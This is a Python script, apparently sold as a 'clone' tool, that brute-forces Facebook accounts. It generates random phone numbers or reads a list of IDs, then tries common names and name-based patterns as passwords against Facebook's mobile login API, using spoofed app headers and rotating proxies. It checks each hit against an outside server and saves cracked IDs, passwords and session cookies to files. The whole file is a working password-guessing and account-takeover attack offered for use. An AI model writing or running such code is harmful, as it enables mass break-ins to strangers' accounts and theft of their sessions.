#SC MAKE BY HABIB HOSSAIN
#WORKING SCRIPT SELLER
#__________________IMPORT____________#
import os,random
import sys,time,uuid
try:
    import requests,bs4,mechanize,httpx
    import rich,json,subprocess,random,string
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
    print('\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;46m] MODULE INSTALLING ')
    os.system('pip install requests rich')
    os.system('pip install mechanize')
    os.system('pip install bs4 httpx')
#________________PROXY______________#
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=1000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
#________________LOOP______________#
loop,ok,cp,user = 0,[],[],[]
cok,plist = [],[]
#________________COLOUR______________#
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
#__________________LINE____________#
def linex():
    print(f'{G1}×××××××××××××××××××××××××××××××××××××××')
def clear():
        os.system(f'clear')
        print(logo)
#________________UA______________#
def sex():
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	fbrv = str(random.randint(000000000,999999999))
	density = random.choice(['2.0'])
	width = random.choice(["1080"])
	height = random.choice(["2400"])
	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/Airtel;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 10;FBSV/13;FBOP/1;FBCA/arm64-v8a:]"
	return ua
#__________________LOGO____________
logo=(f"""
                                                                                                                                                                
\033[38;5;46m                                                 dddddddd                                                                                                       
\033[38;5;46mBBBBBBBBBBBBBBBBB                                d::::::d                 VVVVVVVV           VVVVVVVVhhhhhhh                                      tttt          
\033[38;5;46mB::::::::::::::::B                               d::::::d                 V::::::V           V::::::Vh:::::h                                   ttt:::t          
\033[38;5;46mB::::::BBBBBB:::::B                              d::::::d                 V::::::V           V::::::Vh:::::h                                   t:::::t          
\033[38;5;46mBB:::::B     B:::::B                             d:::::d                  V::::::V           V::::::Vh:::::h                                   t:::::t          
\033[38;5;46m  B::::B     B:::::B  aaaaaaaaaaaaa      ddddddddd:::::d                   V:::::V           V:::::V  h::::h hhhhh       uuuuuu    uuuuuuttttttt:::::ttttttt    
\033[38;5;46m  B::::B     B:::::B  a::::::::::::a   dd::::::::::::::d                    V:::::V         V:::::V   h::::hh:::::hhh    u::::u    u::::ut:::::::::::::::::t    
\033[38;5;46m  B::::BBBBBB:::::B   aaaaaaaaa:::::a d::::::::::::::::d                     V:::::V       V:::::V    h::::::::::::::hh  u::::u    u::::ut:::::::::::::::::t    
\033[38;5;46m  B:::::::::::::BB             a::::ad:::::::ddddd:::::d  ---------------     V:::::V     V:::::V     h:::::::hhh::::::h u::::u    u::::utttttt:::::::tttttt    
\033[38;5;46m  B::::BBBBBB:::::B     aaaaaaa:::::ad::::::d    d:::::d  -:::::::::::::-      V:::::V   V:::::V      h::::::h   h::::::hu::::u    u::::u      t:::::t          
\033[38;5;46m  B::::B     B:::::B  aa::::::::::::ad:::::d     d:::::d  ---------------       V:::::V V:::::V       h:::::h     h:::::hu::::u    u::::u      t:::::t          
\033[38;5;46m  B::::B     B:::::B a::::aaaa::::::ad:::::d     d:::::d                         V:::::V:::::V        h:::::h     h:::::hu::::u    u::::u      t:::::t          
\033[38;5;46m  B::::B     B:::::Ba::::a    a:::::ad:::::d     d:::::d                          V:::::::::V         h:::::h     h:::::hu:::::uuuu:::::u      t:::::t    tttttt
\033[38;5;46mBB:::::BBBBBB::::::Ba::::a    a:::::ad::::::ddddd::::::dd                          V:::::::V          h:::::h     h:::::hu:::::::::::::::uu    t::::::tttt:::::t
\033[38;5;46mB:::::::::::::::::B a:::::aaaa::::::a d:::::::::::::::::d                           V:::::V           h:::::h     h:::::h u:::::::::::::::u    tt::::::::::::::t
\033[38;5;46mB::::::::::::::::B   a::::::::::aa:::a d:::::::::ddd::::d                            V:::V            h:::::h     h:::::h  uu::::::::uu:::u      tt:::::::::::tt
\033[38;5;46mBBBBBBBBBBBBBBBBB     aaaaaaaaaa  aaaa  ddddddddd   ddddd                             VVV             hhhhhhh     hhhhhhh    uuuuuuuu  uuuu        ttttttttttt  
                                                                                                                                                                

\033[38;5;46m×××××××××××××××××××××××××××××××××××××××
 \033[38;5;46m\033[1;91m\033[1;41m\033[1;97m  WELCOME Vhut TERMUX Bad-Vhut ZONE√  \033[;0m\033[1;91m\033[1;92m\033[38;5;46m
\033[38;5;46m×××××××××××××××××××××××××××××××××××××××
 \033[38;5;46m\x1b[1;96mDEVOLPER    \033[1;97m➢    \033[33;1mBad-Vhut          \033[38;5;46m
 \033[38;5;46m\033[38;5;46mFACEBOOK    \033[1;97m➢    \x1b[1;96mBad-Vhut    \033[38;5;46m
 \033[38;5;46m\033[35;1mGITHUB      \033[1;97m➢  \x1b[38;5;208m  Bad-Vhut          \033[38;5;46m
 \033[38;5;46m\033[33;1mWATHSAPP    \033[1;97m➢  \033[38;5;46m  +8801406325030       \033[38;5;46m
 \033[38;5;46m\033[38;5;46mTYPE        \033[1;97m➢    \x1b[1;96mFILE-CLONE           \033[38;5;46m
 \033[38;5;46m\x1b[38;5;208mFROM        \033[1;97m➢    \033[38;5;46mBANGLADESH           \033[38;5;46m
 \033[38;5;46m\x1b[1;96mVERSION     \033[1;97m➢    \033[1;91m\033[1;41m\033[1;97m 0.1 \033[;0m\033[1;91m\033[1;92                  \033[38;5;46m
\033[38;5;46m×××××××××××××××××××××××××××××××××××××××\033[1;37m""")
#__________________MAIN____________#
def menu():
    clear()
    print(f' {A}[{G1}1{A}]\x1b[38;5;208m FILE CLONE ')
    print(f' {A}[{G1}2{A}]\x1b[1;96m RANDOM CLONE ')
    print(f' {A}[{G1}3{A}]\033[33;1m CONTACT OWNER ')
    print(f' {A}[{G1}0{A}]\x1b[38;5;196m EXIT TOOL ')
    linex()
    sex = input(f' {G1}[{A}?{G1}]{G1} CHOICE {A}➢\x1b[1;96m ')
    if sex in ['1']:
        file()
    elif sex in ['2']:
        XXX()
    elif sex in ['3']:
        os.system('xdg-open https://www.facebook.com/shuvo.ahammed.311');menu()
    elif sex in ['0']:
        sys.exit()
    else:
        menu()
#__________________RANDOM DEF____________#
def XXX():
    clear()
    print(f' {A}[{G1}1{A}]\x1b[1;96m BANGLADESH CLONE')
    print(f' {A}[{G1}2{A}]\033[38;5;46m INDIA CLONE')
    print(f' {A}[{G1}0{A}]\x1b[38;5;196m BACK MENU');linex()
    sex = input(f' {A}[{G1}?{A}]{G1} CHOICE {A}➢\x1b[1;96m ')
    if sex in ['1']:
        bd()
    elif sex in ['2']:
        India()
    elif sex in ['0']:
    	menu()
    else:
        XXX()
#__________________BD DEF____________#
def bd():
    clear()
    print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 017{G}/{A}019{G}/{A}018{G}/{A}016');linex()
    code = input(f' {G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')
    clear()
    print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex()
    limit = int(input(f' {G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    with ThreadPool(max_workers=30) as sexy:
        clear()
        print(f' {A}[{G1}≈{A}]{G1} SIM CODE  {A}➢\x1b[1;96m {code}')
        print(f' {A}[{G1}≈{A}]{G1} TOTAL UID {A}➢\033[33;1m {str(len(user))}')
        print(f" {A}[{G1}={A}]\033[1;97m TURN {A}[\033[38;5;46mON{A}/\x1b[38;5;196mOFF{A}]\033[1;97m AIRPLANE MODE ");linex()
        for Vhut in user:
            ids = code + Vhut
            ax = ids[:8]
            bx = ids[:7]
            cx = ids[:6]
            xa = Vhut[1:]
            xb = Vhut[2:]
            psd = [ids,Vhut,ax,bx,cx,xa,xb,'bangladesh','bangla','jannat','jannatul','mariya','sadiya','farjana','sabbir','rakibul','mahidul','nusrat','tamanna','mimmim','suraiya','alamin','arafat','bushra','roksana','tabassum','tanisha','tasnim']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'{G1}×××××××××××××××××××××××××××××××××××××××')
    print(f' {G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f' {G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
    print(f' {G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    print(f' {G1}×××××××××××××××××××××××××××××××××××××××')
    input(f' {G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
    menu()
#__________________INDIA DEF____________#
def India():
    clear()
    print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} +91639{G}/{A}+91934{G}/{A}+91902{G}/{A}+91701');linex()
    code = input(f' {G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')
    clear()
    print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex()
    limit = int(input(f' {G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with ThreadPool(max_workers=30) as sexy:
        clear()
        print(f' {A}[{G1}≈{A}]{G1} SIM CODE  {A}➢\x1b[1;96m {code}')
        print(f' {A}[{G1}≈{A}]{G1} TOTAL UID {A}➢\033[33;1m {str(len(user))}')
        print(f" {A}[{G1}={A}]\033[1;97m TURN {A}[\033[38;5;46mON{A}/\x1b[38;5;196mOFF{A}]\033[1;97m AIRPLANE MODE ");linex()
        for Vhut in user:
            ids = code + Vhut
            psd = [Vhut,ids[:8],'57273200','59039200','57575751','57575752']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'{G1}×××××××××××××××××××××××××××××××××××××××')
    print(f' {G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f' {G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
    print(f' {G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    print(f' {G1}×××××××××××××××××××××××××××××××××××××××')
    input(f' {G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
    menu()
#__________________FILE DEF____________#
def file():
    clear()
    print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A}Bad-Vhut.txt');linex()
    file = input(f' {G1}[{A}?{G1}]{G1} FILE NAME {A}➢{G1} ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f' {G1}[{A}≈{G1}]{G1} FILE NOT FOUND');time.sleep(1)
        file()
    clear()
    print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} {G1}[{A}1-20{G1}]{G1}');linex()
    limit = int(input(f' {G1}[{A}?{G1}]{G1} PASSWORD LIMIT {A}➢{G1} '))
    clear()
    for x in range(limit):
        print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} firstlast{G1}/{A}first123{G1}/{A}last123')
        plist.append(input(f' {G1}[{A}?{G1}]{G1} PASSWORD NO {G1}[{A}{x+1}{G1}]{G1} {A}➢{S} '));linex()
    with ThreadPool(max_workers=30) as sexy:
        tl = str(len(fo))
        clear()
        print(f' {A}[{G1}≈{A}]{G1} TOTAL ID {A}➢\x1b[1;96m {tl}')
        print(f" {A}[{G1}={A}]\033[1;97m TURN {A}[\033[38;5;46mON{A}/\x1b[38;5;196mOFF{A}]\033[1;97m AIRPLANE MODE ");linex()
        for user in fo:
            ids,names = user.split('|')
            psd = plist
            sexy.submit(M1,ids,names,psd)
    print('')
    print(f' {G1}×××××××××××××××××××××××××××××××××××××××')
    print(f' {A}[{G1}≈{A}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f' {A}[{G1}≈{A}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
    print(f' {A}[{G1}≈{A}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    print(f' {G1}×××××××××××××××××××××××××××××××××××××××')
    input(f' {G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
    menu()
#__________________RANDON METHOD____________#
def randm(ids,psd):
    global loop,ok
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write(f'\r\r{A}[{G1}Bad-Vhut-😈{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': sex(),
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1}Bad-Vhut-OK{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/vhut-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                    #print(f'{A}[{G1}🍪{A}]{A} {coki}')
                if res == 'LOCK':
                	print(f'\r\r{A}[\033[1;30mvhut-LOCK{A}]\033[1;30m {uid} {A}|\033[1;30m {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
#__________________FILE METHOD____________#
def M1(ids,names,psd):
    global loop,ok
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write(f'\r\r{A}[{G1}Bad-Vhut-😈{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for pw in psd:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': sex(),
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
            if 'access_token' in po:
                print(f'\r\r{A}[{G1}Vhut-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/Vhut-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{A}[{M}Vhut-CP{A}]{M} {ids} {A}|{M} {pas}')
                open('/sdcard/Vhut-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
if __name__ == '__main__':
    menu()